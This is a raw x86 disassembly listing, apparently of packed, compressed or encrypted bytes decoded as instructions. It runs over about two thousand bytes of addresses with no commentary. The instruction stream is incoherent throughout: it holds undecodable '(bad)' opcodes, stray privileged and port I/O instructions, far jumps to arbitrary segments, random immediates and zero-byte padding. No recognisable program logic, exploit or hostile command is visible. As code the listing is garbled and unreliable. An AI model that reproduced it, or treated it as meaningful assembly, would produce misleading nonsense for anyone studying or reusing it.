  424ea6:	mov    ebx,0x7522663d
  424eab:	mov    edx,ebx
  424ead:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  424eaf:	repz (bad) 
  424eb1:	push   esp
  424eb2:	(bad)  
  424eb3:	aam    0xd7
  424eb5:	mov    DWORD PTR [ebx],edx
  424eb7:	and    ch,BYTE PTR [eax+0x7]
  424eba:	sub    BYTE PTR [edi],bh
  424ebc:	pop    es
  424ebd:	mul    al
  424ebf:	shl    DWORD PTR [edx-0x9],cl
  424ec2:	cmp    edi,DWORD PTR [ebp-0x13]
  424ec5:	mov    cl,0xf0
  424ec7:	or     eax,DWORD PTR es:[edx-0x73eaa9a6]
  424ece:	test   ebp,edx
  424ed0:	adc    al,0xbe
  424ed2:	jae    0x424e91
  424ed4:	mov    ds:0x186b9973,al
  424ed9:	pusha  
  424eda:	cmp    BYTE PTR [ebp-0x39],dh
  424edd:	adc    esp,esi
  424edf:	cdq    
  424ee0:	xchg   ecx,eax
  424ee1:	cmp    DWORD PTR [eax+0x997e037],ebx
  424ee7:	stos   BYTE PTR es:[edi],al
  424ee8:	jo     0x424e78
  424eea:	fdiv   DWORD PTR [ebx+edx*2]
  424eed:	push   0x51
  424eef:	imul   ebx,esi,0x93621582
  424ef5:	cld    
  424ef6:	adc    BYTE PTR ds:0xd4732407,bl
  424efc:	inc    ecx
  424efd:	add    edi,DWORD PTR ds:0xaf433c9f
  424f03:	pop    edx
  424f04:	ss xchg esi,edi
  424f07:	shl    BYTE PTR [ebx],0x9e
  424f0a:	inc    eax
  424f0b:	fucomip st,st(2)
  424f0d:	push   ecx
  424f0e:	leave  
  424f0f:	jne    0x424e92
  424f11:	mov    al,0x55
  424f13:	sbb    bh,bh
  424f15:	retf   0xe6f8
  424f18:	mov    bl,0xbd
  424f1a:	xor    esp,esi
  424f1c:	lods   al,BYTE PTR ds:[esi]
  424f1d:	retf   0x6880
  424f20:	loop   0x424f22
  424f22:	outs   dx,DWORD PTR ds:[esi]
  424f23:	pop    esi
  424f24:	das    
  424f25:	in     al,dx
  424f26:	fwait
  424f27:	idiv   BYTE PTR [ebx]
  424f29:	xchg   ecx,eax
  424f2a:	push   edx
  424f2b:	xchg   edi,eax
  424f2c:	xchg   DWORD PTR [edx-0x43d02714],ebp
  424f32:	inc    ecx
  424f33:	inc    ebp
  424f34:	ja     0x424eb8
  424f36:	popa   
  424f37:	xor    al,0x6e
  424f39:	and    eax,0x8c99c3ea
  424f3e:	ins    DWORD PTR es:[edi],dx
  424f3f:	cmp    BYTE PTR [ebp+0x5f33835],dl
  424f45:	popa   
  424f46:	int    0xa
  424f48:	inc    esi
  424f49:	enter  0xe40b,0x66
  424f4d:	into   
  424f4e:	mov    esi,0x4cc36354
  424f53:	les    ebx,FWORD PTR [ecx+0x64e4d8bc]
  424f59:	fistp  WORD PTR [eax]
  424f5b:	and    eax,0xb7503100
  424f60:	pop    edi
  424f61:	pop    edx
  424f62:	or     BYTE PTR [eax],0xb5
  424f65:	mov    ebx,0x610f7d3e
  424f6a:	jecxz  0x424ef2
  424f6c:	sbb    DWORD PTR [edx+0x70235968],esp
  424f72:	xor    bl,dh
  424f74:	sbb    eax,0xe6791748
  424f79:	add    ah,al
  424f7b:	bound  edx,QWORD PTR [edx-0x3d]
  424f7e:	into   
  424f7f:	jno    0x424f49
  424f81:	adc    al,0x48
  424f83:	mov    ds:0xcbc8201,al
  424f88:	call   0x3ee2:0xa407cc8a
  424f8f:	sbb    ebx,DWORD PTR [esi+ebp*8-0x5ae6be92]
  424f96:	nop
  424f97:	repz push edi
  424f99:	bound  eax,QWORD PTR ss:[ebx]
  424f9c:	or     edi,DWORD PTR [edi+0x1d]
  424f9f:	xchg   esp,eax
  424fa0:	ins    DWORD PTR es:[edi],dx
  424fa1:	sbb    BYTE PTR [ebx-0x50],dh
  424fa4:	fnstsw WORD PTR [edx]
  424fa6:	lea    edx,[esi+ebx*1+0x72]
  424faa:	movups xmm2,xmm2
  424fad:	std    
  424fae:	cmp    DWORD PTR [eax-0x236d4481],0x4f
  424fb5:	mov    dl,0xa7
  424fb7:	pop    ds
  424fb8:	push   ds
  424fb9:	add    bh,0x72
  424fbc:	mov    ch,0x1d
  424fbe:	xchg   ebx,eax
  424fbf:	adc    eax,0xe62bddbb
  424fc4:	mov    ah,0x9f
  424fc6:	into   
  424fc7:	xchg   ecx,eax
  424fc8:	std    
  424fc9:	vpsraw ymm7,ymm3,XMMWORD PTR ds:0x2c34a959
  424fd1:	xor    eax,0xaa8ae3c
  424fd6:	icebp  
  424fd7:	and    BYTE PTR [edx+0x18dd9225],bh
  424fdd:	jbe    0x424ffc
  424fdf:	xor    DWORD PTR [esi-0x60],0x31
  424fe3:	call   0x654e779f
  424fe8:	(bad)  
  424fe9:	push   ebx
  424fea:	mov    WORD PTR [edx+0x52476450],cs
  424ff0:	or     ecx,DWORD PTR [ebp-0x31dbf1be]
  424ff6:	add    eax,0xadb1fdcf
  424ffb:	or     eax,0x26c75362
  425000:	ds push edx
  425002:	ror    DWORD PTR [eax],1
  425004:	push   ebp
  425005:	fidivr DWORD PTR [eax+0x3d566902]
  42500b:	push   edi
  42500c:	ins    DWORD PTR es:[edi],dx
  42500d:	rcr    DWORD PTR [eax+0x4f],0x18
  425011:	inc    esi
  425012:	sbb    al,0x83
  425014:	neg    DWORD PTR [ebp+0x46]
  425017:	inc    ecx
  425018:	mov    eax,ds:0x298656ee
  42501d:	adc    ebx,DWORD PTR [ecx-0x70]
  425020:	pop    esi
  425021:	pop    ebx
  425022:	cmp    eax,0xda76deb9
  425027:	push   es
  425028:	outs   dx,BYTE PTR ds:[esi]
  425029:	shl    BYTE PTR [ecx-0x107f5e76],1
  42502f:	mov    edx,0x9c134258
  425034:	dec    ebp
  425035:	sar    BYTE PTR [edi-0x5c],cl
  425038:	popf   
  425039:	cmp    al,0xc5
  42503b:	pushf  
  42503c:	mov    esp,0xb111ad5b
  425041:	cmp    ebx,edi
  425043:	shl    DWORD PTR [esi+0x7c],1
  425046:	mov    ch,0xb
  425048:	out    0xde,eax
  42504a:	out    0x14,eax
  42504c:	mov    BYTE PTR [eax+eax*1+0x0],ch
  425053:	add    BYTE PTR [eax],al
  425055:	add    BYTE PTR [eax],al
  425057:	add    BYTE PTR [eax],al
  425059:	add    BYTE PTR [ebx-0x73],al
  42505c:	pop    ds
  42505d:	and    bh,bl
  42505f:	mov    dl,0x7f
  425061:	out    dx,eax
  425062:	leave  
  425063:	enter  0xb54,0x62
  425067:	fld    QWORD PTR [edi+0x1c87c5f]
  42506d:	add    ah,bh
  42506f:	add    DWORD PTR [eax],eax
  425071:	add    BYTE PTR [ebp-0x20],ah
  425074:	fstp   TBYTE PTR [edi]
  425076:	inc    BYTE PTR [ecx]
  425078:	add    eax,0x3add5ee0
  42507d:	rcr    DWORD PTR [edx+0x6b],1
  425080:	jecxz  0x4250ac
  425082:	imul   ebx,DWORD PTR [ebp-0x5fe8e354],0xa81cc34
  42508c:	stos   DWORD PTR es:[edi],eax
  42508d:	adc    dl,ah
  42508f:	xchg   DWORD PTR [esi+0x67],esp
  425092:	mov    BYTE PTR [ecx],ah
  425094:	xor    BYTE PTR [edx-0x4e5385ce],dh
  42509a:	push   edx
  42509b:	cmp    edi,DWORD PTR [ebx-0x63be43e7]
  4250a1:	lods   al,BYTE PTR ds:[esi]
  4250a2:	pop    ds
  4250a3:	mov    esp,0x2a1b40f0
  4250a8:	mov    edx,0x3ed3e138
  4250ad:	sbb    ebx,DWORD PTR [ecx]
  4250af:	sub    eax,0x7e341cdb
  4250b4:	ins    DWORD PTR es:[edi],dx
  4250b5:	pop    edx
  4250b6:	push   edi
  4250b7:	sub    eax,0x80f35046
  4250bc:	inc    ebx
  4250bd:	(bad)  
  4250be:	or     DWORD PTR [edx],ecx
  4250c0:	(bad)  
  4250c1:	and    DWORD PTR ds:0x2f5e256a,edi
  4250c7:	nop
  4250c8:	push   ebp
  4250c9:	out    0x7c,eax
  4250cb:	ds xor al,0x44
  4250ce:	bnd jp 0x425087
  4250d1:	add    BYTE PTR [edi],dh
  4250d3:	pop    es
  4250d4:	enter  0xd1a3,0xd6
  4250d8:	cmp    cl,BYTE PTR [esi-0x28c1de45]
  4250de:	scas   eax,DWORD PTR es:[edi]
  4250df:	outs   dx,BYTE PTR ds:[esi]
  4250e0:	ins    DWORD PTR es:[edi],dx
  4250e1:	aad    0xde
  4250e3:	addr16 push 0xffffffe1
  4250e6:	adc    al,BYTE PTR [ebp-0x33]
  4250e9:	dec    esp
  4250ea:	imul   eax,DWORD PTR [edi-0x6109a221],0x6d
  4250f1:	xor    bl,BYTE PTR [edx]
  4250f3:	div    DWORD PTR [ebx-0x65684ebe]
  4250f9:	scas   eax,DWORD PTR es:[edi]
  4250fa:	shl    DWORD PTR [edx+0x2fdcbefd],cl
  425100:	test   eax,0xb0084aeb
  425105:	jnp    0x4250db
  425107:	ss xchg ecx,eax
  425109:	mov    ch,0x28
  42510b:	cmp    BYTE PTR [edx+0x44],ah
  42510e:	lds    ecx,FWORD PTR [esi]
  425110:	int    0x5d
  425112:	mov    eax,0x60148f5d
  425117:	lea    eax,[edx-0x66]
  42511a:	inc    esi
  42511b:	in     eax,0xd0
  42511d:	jnp    0x425189
  42511f:	sub    DWORD PTR [ecx+edi*2],edx
  425122:	cmp    al,0x3a
  425124:	jno    0x42518c
  425126:	popf   
  425127:	or     dl,bl
  425129:	sbb    BYTE PTR [ebx+edi*4+0x6857e441],bh
  425130:	jne    0x425178
  425132:	mov    eax,db1
  425135:	sbb    BYTE PTR [edi],dh
  425137:	sbb    eax,DWORD PTR [ebx]
  425139:	ret    0x80e7
  42513c:	(bad)  
  42513d:	nop
  42513e:	inc    esi
  42513f:	outs   dx,BYTE PTR ds:[esi]
  425140:	retf   0x178e
  425143:	jmp    0x4250c8
  425145:	jp     0x4251a9
  425147:	fs ss cmp al,0xcf
  42514b:	loop   0x4251a5
  42514d:	jecxz  0x425195
  42514f:	and    BYTE PTR [edx],cl
  425151:	sub    BYTE PTR [edi+0x1a5e8326],cl
  425157:	pop    edi
  425158:	push   edx
  425159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42515a:	jnp    0x4251d7
  42515c:	adc    BYTE PTR [eax+0x6483ae79],dl
  425162:	ret    0x64fc
  425165:	push   ebp
  425166:	mov    WORD PTR [ecx+0x6ddb378c],ds
  42516c:	push   esi
  42516d:	add    cl,BYTE PTR [edi]
  42516f:	push   ss
  425170:	dec    edx
  425171:	mov    eax,0x55965f16
  425176:	mov    ds:0x18dd8eda,al
  42517b:	test   eax,0x47eaf525
  425180:	xor    al,0xea
  425182:	jbe    0x4251e6
  425184:	sti    
  425185:	sub    edx,esi
  425187:	pop    ecx
  425188:	jmp    0x425162
  42518a:	scas   eax,DWORD PTR es:[edi]
  42518b:	jbe    0x4251a2
  42518d:	mov    ecx,0xfadc4980
  425192:	sub    BYTE PTR [edx+0x345b9594],dl
  425198:	pop    esi
  425199:	test   dl,ah
  42519b:	cmp    DWORD PTR [ecx-0x5836c4df],edi
  4251a1:	mov    bh,0x1c
  4251a3:	jl     0x42513b
  4251a5:	add    esp,DWORD PTR [ebp+0x66]
  4251a8:	pop    ecx
  4251a9:	sbb    eax,0x26e59eb2
  4251ae:	push   esi
  4251af:	aam    0xb9
  4251b1:	mov    al,0x54
  4251b3:	repz mov ch,0xdc
  4251b6:	mov    dh,0xc7
  4251b8:	add    eax,0x40ae89a
  4251bd:	or     bh,BYTE PTR [edi+0x26ec64c1]
  4251c3:	xor    eax,0xbb11c76a
  4251c8:	mov    cl,0xa2
  4251ca:	push   esi
  4251cb:	push   eax
  4251cc:	fsubr  DWORD PTR [esp+eax*8-0x16]
  4251d0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4251d2:	jle    0x425252
  4251d4:	sti    
  4251d5:	dec    edi
  4251d6:	or     bl,BYTE PTR [eax+ebp*2+0x6527df51]
  4251dd:	add    cl,0x3
  4251e0:	mov    dl,0x22
  4251e2:	fs xchg ecx,eax
  4251e4:	(bad)  
  4251e6:	mov    ch,0xf6
  4251e8:	add    bh,BYTE PTR [edx-0x66]
  4251eb:	dec    edx
  4251ec:	dec    ebx
  4251ed:	rcr    DWORD PTR [edi*4-0xa917f3a],1
  4251f4:	inc    esp
  4251f5:	in     eax,dx
  4251f6:	xchg   ebx,eax
  4251f7:	scas   al,BYTE PTR es:[edi]
  4251f8:	ret    
  4251f9:	xchg   esi,eax
  4251fa:	jb     0x42520d
  4251fc:	sahf   
  4251fd:	cmp    BYTE PTR [esi+0xf],bl
  425200:	jnp    0x4251e7
  425202:	jp     0x42518f
  425204:	daa    
  425205:	out    0x49,eax
  425207:	test   al,0xf6
  425209:	inc    esp
  42520a:	xor    eax,edx
  42520c:	(bad)
  42520f:	repz jg 0x42522b
  425212:	pop    ds
  425213:	mov    ecx,0xf6622992
  425218:	or     edi,edi
  42521a:	dec    esi
  42521b:	sar    BYTE PTR [ecx+0x1f],0x46
  42521f:	jmp    0x4251d7
  425221:	mov    BYTE PTR [eax+0x61],dl
  425224:	and    al,0x21
  425226:	jmp    0x42523e
  425228:	(bad)  
  425229:	ins    BYTE PTR es:[edi],dx
  42522a:	mov    ebx,0xa7825a10
  42522f:	int    0x94
  425231:	or     bh,BYTE PTR [edi]
  425233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425234:	or     al,0xa7
  425236:	je     0x4251ff
  425238:	jle    0x425211
  42523a:	jmp    0xdd0b:0xd48b405
  425241:	lods   eax,DWORD PTR ds:[esi]
  425242:	add    al,0x88
  425244:	or     edx,DWORD PTR [ecx+0x4]
  425247:	dec    esi
  425248:	cld    
  425249:	pop    ecx
  42524a:	(bad)  
  42524b:	int    0xfc
  42524d:	sbb    al,0x63
  42524f:	loop   0x425275
  425251:	add    edi,esp
  425253:	push   esp
  425254:	inc    edx
  425255:	sahf   
  425256:	or     al,0xfe
  425258:	lea    ebx,[esi+ebp*2+0x46]
  42525c:	addr16 pop ebx
  42525e:	ja     0x425216
  425260:	xchg   ebp,eax
  425261:	(bad)  
  425262:	fst    QWORD PTR [ebp+0x7f]
  425265:	stc    
  425266:	sti    
  425267:	dec    ebx
  425268:	les    ecx,FWORD PTR [ecx+0x8]
  42526b:	inc    esi
  42526c:	inc    ecx
  42526d:	sbb    BYTE PTR [eax],al
	...
  425277:	add    BYTE PTR [eax],al
  425279:	add    ah,dh
  42527b:	cmp    DWORD PTR [edx-0x2002081],edx
  425281:	mov    ebx,0xd77f6470
  425286:	pop    edi
  425287:	cmp    esi,DWORD PTR ds:0x1ca7890
  42528d:	add    ah,bh
  42528f:	add    DWORD PTR [eax],eax
  425291:	add    ch,cl
  425293:	jge    0x425281
  425295:	mov    al,0x51
  425297:	test   DWORD PTR [esi+0x63b036d9],esp
  42529d:	mov    al,ds:0xa3d2c3ad
  4252a2:	sub    eax,0xcbd07a25
  4252a7:	fldenv [eax+eax*4+0x39]
  4252ab:	xchg   esi,eax
  4252ac:	in     al,0x36
  4252ae:	mov    dh,0x3a
  4252b0:	or     DWORD PTR [ebx+0x3e],edi
  4252b3:	in     al,0x39
  4252b5:	bound  eax,QWORD PTR [edi]
  4252b7:	sub    DWORD PTR [ebx+0x8],ebp
  4252ba:	cmp    eax,0x444837de
  4252bf:	jp     0x425327
  4252c1:	call   0xa49020cb
  4252c6:	call   0xdb88:0x8d8e50c0
  4252cd:	gs fwait
  4252cf:	mov    al,ds:0x9e34006d
  4252d4:	in     al,0x8
  4252d6:	cs ror esi,cl
  4252d9:	pop    es
  4252da:	scas   al,BYTE PTR es:[edi]
  4252db:	cmc    
  4252dc:	jge    0x4252b0
  4252de:	xchg   esi,eax
  4252df:	fldcw  WORD PTR [ecx+edi*1+0x62530fc7]
  4252e6:	jno    0x425362
  4252e8:	sub    eax,0x94d2a0b1
  4252ed:	or     DWORD PTR [edi+0x6b],ebx
  4252f0:	add    BYTE PTR [ebx],dl
  4252f2:	enter  0x5e7f,0x9f
  4252f6:	sub    eax,0xbc5a3edc
  4252fb:	and    al,0x67
  4252fd:	add    eax,0xfb562cf8
  425302:	cmp    DWORD PTR [ebx+0x6e],edi
  425305:	clc    
  425306:	mov    ah,0xa9
  425308:	dec    esi
  425309:	jae    0x425323
  42530b:	jmp    0xd924:0xf35da4e
  425312:	fadd   st(2),st
  425314:	fstp   DWORD PTR [eax+edx*1+0x56]
  425318:	and    eax,0x4a34a223
  42531d:	cmp    eax,0xabb61b42
  425322:	xor    al,0x60
  425324:	repnz adc al,0x12
  425327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425328:	xchg   edi,eax
  425329:	sub    edi,DWORD PTR [edx-0x13363875]
  42532f:	and    eax,0x15822f0c
  425334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425335:	imul   esp,DWORD PTR [edi+0x77],0x684c766b
  42533c:	jb     0x4252ca
  42533e:	dec    edx
  42533f:	sbb    al,0xf9
  425341:	pop    ebx
  425342:	and    BYTE PTR [ebx-0x675a052f],0x9
  425349:	add    dh,BYTE PTR [edx]
  42534b:	fistp  QWORD PTR [ecx+0xa7a6db3]
  425351:	jg     0x425397
  425353:	ret    0xed11
  425356:	(bad)  
  425357:	inc    esi
  425359:	xor    BYTE PTR [ecx-0x23],dh
  42535c:	jmp    0x2db1:0x1303a3e1
  425363:	std    
  425364:	cmp    ch,BYTE PTR [edi]
  425366:	push   esi
  425367:	arpl   WORD PTR [esi-0x306755f8],bp
  42536d:	dec    esi
  42536e:	scas   al,BYTE PTR es:[edi]
  42536f:	xlat   BYTE PTR ds:[ebx]
  425370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425371:	adc    eax,0x2be6b723
  425376:	mov    eax,0x55e7290b
  42537b:	(bad)  
  42537c:	xchg   ebp,eax
  42537d:	sub    ecx,edi
  42537f:	fild   WORD PTR [edi+0x39]
  425382:	outs   dx,DWORD PTR ds:[esi]
  425383:	jns    0x425311
  425385:	sahf   
  425386:	sbb    ecx,DWORD PTR [esi+eax*8-0x4e]
  42538a:	xchg   BYTE PTR [ebp-0x2210f24c],ah
  425390:	push   es
  425391:	jne    0x4253e1
  425393:	js     0x4253da
  425395:	jae    0x4253d6
  425397:	stos   BYTE PTR es:[edi],al
  425398:	add    eax,0xe4b1d59e
  42539d:	pop    edx
  42539e:	inc    ebx
  42539f:	in     eax,0xd1
  4253a1:	push   es
  4253a2:	repnz loope 0x4253ec
  4253a5:	gs push ebx
  4253a7:	add    esi,DWORD PTR [ebx+0x69]
  4253aa:	dec    esp
  4253ab:	sub    BYTE PTR [ebp-0x3b],ch
  4253ae:	adc    BYTE PTR [ebx+esi*1],dh
  4253b1:	out    0x6b,eax
  4253b3:	sar    ch,0xeb
  4253b6:	fld    DWORD PTR [esi-0x231277cf]
  4253bc:	or     ebp,eax
  4253be:	push   ds
  4253bf:	leave  
  4253c0:	push   eax
  4253c1:	jp     0x425405
  4253c3:	jb     0x425409
  4253c5:	adc    dh,al
  4253c7:	lea    eax,[ecx-0x2d86e4a4]
  4253cd:	or     BYTE PTR [edi+0x2e],dl
  4253d0:	aas    
  4253d1:	xor    bh,dl
  4253d3:	enter  0x89ae,0xba
  4253d7:	rcr    BYTE PTR [ebx+0x74],1
  4253da:	sbb    ebp,DWORD PTR [eax+0x26]
  4253dd:	xlat   BYTE PTR ds:[ebx]
  4253de:	sub    DWORD PTR [edx+0x26f228a3],ebx
  4253e4:	dec    ebp
  4253e5:	mul    bh
  4253e7:	inc    ebx
  4253e8:	jnp    0x4253c4
  4253ea:	scas   eax,DWORD PTR es:[edi]
  4253eb:	push   ecx
  4253ec:	push   cs
  4253ed:	xor    BYTE PTR [ebx],ah
  4253ef:	push   ebx
  4253f0:	mov    ah,0xe6
  4253f2:	mov    eax,0x398031b8
  4253f7:	sar    BYTE PTR ds:0x25c1f956,0x4e
  4253fe:	jns    0x425433
  425400:	outs   dx,DWORD PTR ds:[esi]
  425401:	cmp    BYTE PTR [ebx],ah
  425403:	div    BYTE PTR [eax-0x4d]
  425406:	or     al,0xf5
  425408:	nop
  425409:	fmul   QWORD PTR [esi-0x294330c9]
  42540f:	xchg   DWORD PTR ds:0x6cc48d81,edi
  425415:	pop    ds
  425416:	pop    edi
  425417:	fnstsw WORD PTR [eax]
  425419:	hlt    
  42541a:	dec    esi
  42541b:	sbb    DWORD PTR [ecx],edx
  42541d:	cmp    dh,BYTE PTR [ebp-0x7063efab]
  425423:	rcr    DWORD PTR es:[edi+0x61],1
  425427:	lods   eax,DWORD PTR ds:[esi]
  425428:	popf   
  425429:	pop    edi
  42542a:	pop    esp
  42542b:	mov    ds:0x36278108,eax
  425430:	pop    esp
  425431:	dec    esi
  425432:	sub    bl,ah
  425434:	sbb    ebp,DWORD PTR [ebx+0x66]
  425437:	data16 fucom st(2)
  42543a:	dec    edx
  42543b:	daa    
  42543c:	out    0xa8,eax
  42543e:	sub    BYTE PTR [esi-0x1c8e1a6b],cl
  425444:	loopne 0x4253cf
  425446:	int3   
  425447:	xchg   ah,ch
  425449:	fidivr WORD PTR [edx-0xb90361a]
  42544f:	loopne 0x425428
  425451:	(bad)  
  425452:	sti    
  425453:	jnp    0x4253d6
  425455:	arpl   WORD PTR [edx-0x10],ax
  425458:	lea    ebp,[ebx+0x76]
  42545b:	and    bl,BYTE PTR [esi+0x5c3db68a]
  425461:	cmp    edx,DWORD PTR [eax-0x73996c46]
  425467:	enter  0x7f0e,0x2d
  42546b:	mov    eax,ds:0x59cdd1d9
  425470:	xchg   edi,eax
  425471:	pop    ss
  425472:	in     eax,dx
  425473:	shl    DWORD PTR [eax+0x68321e60],1
  425479:	dec    eax
  42547a:	sub    eax,0x8f993c21
  42547f:	test   al,0x44
  425481:	in     eax,dx
  425482:	cmp    DWORD PTR [bp+si],ebp
  425485:	sub    esp,0xffffff90
  425488:	ins    BYTE PTR es:[edi],dx
  425489:	pop    ebp
  42548a:	fadd   st,st(5)
  42548c:	nop
  42548d:	mov    BYTE PTR [eax],0x0
	...
  425498:	add    BYTE PTR [eax],al
  42549a:	push   esp
  42549b:	ds and al,0x19
  42549e:	outs   dx,BYTE PTR ds:[esi]
  42549f:	sbb    edi,DWORD PTR [ebp+0x7f]
  4254a2:	(bad)  
  4254a3:	aam    0x10
  4254a5:	dec    edi
  4254a6:	sbb    al,0xac
  4254a8:	imul   edx,DWORD PTR [ecx+0x1cc74],0x1fc
  4254b2:	jecxz  0x4254c0
  4254b4:	and    DWORD PTR [ecx+0x6],edx
  4254b7:	iret   
  4254b8:	jmp    0x3f4a:0x6cd0fed9
  4254bf:	dec    esi
  4254c0:	or     esp,0x21
  4254c3:	push   cs
  4254c4:	ins    BYTE PTR es:[edi],dx
  4254c5:	std    
  4254c6:	pop    es
  4254c7:	mov    ebp,0xe7db1fad
  4254cc:	inc    edx
  4254cd:	sbb    DWORD PTR [edx+0xb],0x41
  4254d1:	fwait
  4254d2:	cmp    BYTE PTR [ebx+edi*8],ch
  4254d5:	xor    eax,DWORD PTR ds:0xf34f45b
  4254db:	or     eax,0xc6eac8ed
  4254e0:	sbb    eax,0x5f5f8791
  4254e5:	push   esi
  4254e6:	daa    
  4254e7:	mov    ecx,0xc83c3dcd
  4254ec:	test   eax,0x84b5eb0f
  4254f1:	dec    edi
  4254f2:	jl     0x4254b3
  4254f4:	ffreep st(3)
  4254f6:	sbb    al,0xac
  4254f8:	jno    0x42548a
  4254fa:	popa   
  4254fb:	push   DWORD PTR [edi+0x4829538b]
  425501:	mov    WORD PTR ds:0x54de6a80,es
  425507:	lidtd  [edx-0x3c]
  42550b:	xchg   edx,eax
  42550c:	ins    DWORD PTR es:[edi],dx
  42550d:	mov    al,0x2a
  42550f:	sbb    eax,0x725fcaf1
  425514:	add    ah,bh
  425516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425517:	mov    ch,0x85
  425519:	fnstsw WORD PTR [esi-0x58]
  42551c:	jp     0x4254b5
  42551e:	sbb    BYTE PTR [ebx-0x3a],0x6f
  425522:	pop    esp
  425523:	mov    esi,0x3cee9351
  425528:	xor    eax,0xba155d3f
  42552d:	or     dh,BYTE PTR [eax+0x266a64e9]
  425533:	int    0x7f
  425535:	lods   eax,DWORD PTR ds:[esi]
  425536:	mov    ebp,0x31ea032c
  42553b:	rol    BYTE PTR [edx],0x73
  42553e:	int3   
  42553f:	push   ss
  425540:	dec    edx
  425541:	arpl   si,si
  425543:	retf   
  425544:	mov    dl,0xd6
  425546:	lock retf 
  425548:	jnp    0x4254e7
  42554a:	dec    ecx
  42554b:	push   ebx
  42554c:	and    DWORD PTR [eax-0x8599bb5],ebx
  425552:	(bad)  
  425553:	pop    ebp
  425554:	cli    
  425555:	mov    eax,ds:0x42ad29a4
  42555a:	adc    al,0x92
  42555c:	ret    
  42555d:	fist   WORD PTR [ebx]
  42555f:	(bad)  
  425561:	and    al,0x7d
  425563:	ret    
  425564:	pop    edx
  425565:	add    ax,0x3483
  425569:	jae    0x425571
  42556b:	pop    esp
  42556c:	or     DWORD PTR [edi+0x7f],edx
  42556f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425570:	mov    esi,0x4dbf5e76
  425575:	or     al,0x26
  425577:	int    0x68
  425579:	pop    esp
  42557a:	mov    ecx,0x23bce53c
  42557f:	(bad)  
  425581:	and    edx,DWORD PTR [edx]
  425583:	aam    0x96
  425585:	sub    DWORD PTR [edx+ebp*1+0x4a],edi
  425589:	mov    ch,0x21
  42558b:	cmp    ecx,ecx
  42558d:	cmp    dl,BYTE PTR [edi*1-0x33c9a44f]
  425594:	mov    ds:0xad8deea,eax
  425599:	cmp    al,0x5
  42559b:	add    dl,ch
  42559d:	sbb    edx,edx
  42559f:	lods   al,BYTE PTR ds:[esi]
  4255a0:	sbb    al,BYTE PTR [edi+0x1a81ce17]
  4255a6:	xchg   BYTE PTR [edi],ch
  4255a8:	push   esi
  4255a9:	add    al,0xe2
  4255ab:	mov    ds:0x6847ea90,eax
  4255b0:	jp     0x4255a6
  4255b2:	sub    bl,BYTE PTR [esi-0x1adcf193]
  4255b8:	gs pop esi
  4255ba:	xchg   ebp,eax
  4255bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255bc:	mov    ds:0xe776b078,al
  4255c1:	arpl   si,bp
  4255c3:	or     esp,DWORD PTR [eax-0x6db8d8d8]
  4255c9:	out    0x72,eax
  4255cb:	retf   
  4255cc:	xchg   ebx,eax
  4255cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255ce:	out    dx,al
  4255cf:	(bad)  
  4255d0:	call   FWORD PTR [edx-0x49c69d4b]
  4255d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255d7:	sbb    edi,DWORD PTR [edi+ebx*4]
  4255da:	jae    0x425581
  4255dc:	cmp    DWORD PTR [eax],edi
  4255de:	sbb    DWORD PTR [esp+ebx*4+0x3],0x77
  4255e3:	in     al,dx
  4255e4:	push   ebp
  4255e5:	mov    ?,WORD PTR [ecx-0x35]
  4255e8:	fs cmp eax,0x72ddc7fd
  4255ee:	cwde   
  4255ef:	test   DWORD PTR [ebx],edx
  4255f1:	mov    BYTE PTR [ebp+0x41],cl
  4255f4:	cmc    
  4255f5:	cld    
  4255f6:	push   ss
  4255f7:	dec    edi
  4255f8:	mul    BYTE PTR [esi+0x19]
  4255fb:	mov    ebp,0x97f84656
  425600:	pop    es
  425601:	out    dx,al
  425602:	jae    0x425651
  425604:	retf   0xe2c2
  425607:	aam    0xb0
  425609:	and    eax,0x797d0ee7
  42560e:	in     eax,dx
  42560f:	jo     0x42560b
  425611:	xor    al,0x4e
  425613:	fwait
  425614:	dec    edx
  425615:	or     al,0xbc
  425617:	es shr ah,1
  42561a:	in     al,0xa6
  42561c:	mov    ebx,0xfc616960
  425622:	jbe    0x4255d2
  425624:	(bad)  
  425625:	aam    0x53
  425627:	test   eax,0xf04f2f0f
  42562c:	aad    0xee
  42562e:	xchg   ebp,eax
  42562f:	out    dx,eax
  425630:	mov    edi,0x10590723
  425635:	adc    eax,0x26e903cf
  42563a:	popa   
  42563b:	sbb    eax,0xe3a55d59
  425640:	jp     0x4256a1
  425642:	and    al,0x2f
  425644:	call   FWORD PTR [esi+0x6202c1e0]
  42564a:	xchg   ebx,eax
  42564b:	mov    BYTE PTR [esi+ebx*8],al
  42564e:	js     0x42566d
  425650:	sbb    eax,0x773eb6d9
  425655:	call   0xb4431ede
  42565a:	jnp    0x42560f
  42565c:	mov    ch,0x5f
  42565e:	sub    BYTE PTR [ecx+ebp*1-0x3d],dh
  425662:	iret   
  425663:	or     esi,ecx
  425665:	xor    ah,dl
  425667:	push   es
  425668:	clc    
  425669:	inc    ebx
  42566a:	ret    0xd18d
  42566d:	add    ecx,DWORD PTR [eax-0x20]
  425670:	pop    ss
  425671:	cmc    
  425672:	ficom  WORD PTR [esi+0x49766323]
  425678:	rol    DWORD PTR [ecx],cl
  42567a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42567b:	sti    
  42567c:	dec    ebx
  42567d:	jne    0x42564d
  42567f:	fiadd  DWORD PTR [esi]
  425681:	mov    ss,esp
  425683:	fs cwde 
  425685:	ja     0x4256ec
  425687:	fucomp st(5)
  425689:	jnp    0x425654
  42568b:	scas   eax,DWORD PTR es:[edi]
  42568c:	addr16 mov dl,0x7a
  42568f:	dec    edx
  425690:	dec    ebx
  425691:	into   
  425692:	sbb    BYTE PTR [ebp+0x71],dh
  425695:	add    BYTE PTR cs:[ebx+edx*2+0x30],dl
  42569a:	repnz mov ch,0xee
  42569d:	faddp  st(3),st
